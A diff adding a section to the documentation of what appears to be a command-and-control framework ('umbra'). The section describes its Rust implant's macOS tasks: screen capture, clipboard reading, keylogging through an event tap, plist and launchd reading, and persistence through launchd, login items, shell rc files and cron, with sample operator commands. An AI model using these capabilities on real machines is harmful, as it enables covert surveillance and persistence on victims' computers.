@@ -904,6 +904,41 @@ is answered with an error and not with a silence, and its self test runs a
 whole cycle against a server that lives in the process, so the binary can
 be proved to work before it goes near a target.
 
+### The mac is a first-class target
+
+The Rust implant carries the whole catalogue on a mac, and the things that
+have a Windows name have a mac name. The operator asks for the same thing
+either way:
+
+| The Windows way | The mac way |
+|---|---|
+| the registry (`HKLM\SOFTWARE\Microsoft`) | a property list (`plutil -p`), a domain of the defaults (`defaults read`) or a launchd job (`launchctl print`) |
+| the screen | `screencapture` |
+| the clipboard | `pbpaste` |
+| the keys | an event tap (`CGEventTapCreate`), listen-only |
+
+The `registry` task on a mac reads what it is given, in this order:
+
+* `launchd:system/com.apple.something` is a job of the launchd domain
+  (`launchctl print`),
+* a key that starts with `/` is the file itself,
+* every other key is the property list of the hive
+  (`$HOME/Library/Preferences/<key>.plist` for `HKCU`,
+  `/Library/Preferences/<key>.plist` for `HKLM`) and, when there is no such
+  file, the domain of the defaults (`defaults read <key> [value]`).
+
+```bash
+umbra registry mac-01 "com.apple.Safari" --hive HKCU   # a domain of the defaults
+umbra registry mac-01 launchd:system/com.apple.something # a job of launchd
+umbra screenshot mac-01 screen.png                      # the screen of the mac
+umbra clipboard mac-01                                 # the clipboard of the mac
+umbra keylog-file mac-01 /tmp/keys.log --seconds 60    # the keys, into a file
+```
+
+The persistence of a mac is `launchd.agent`, `launchd.daemon`, `loginitem`,
+`shell_rc` and `cron.user`, and the manager reads every one of them back
+before it says that it is installed.
+
 ## 4. Beacon tuning
 
 The server dictates cadence at handshake time (`beacon.sleep` / `beacon.jitter`)
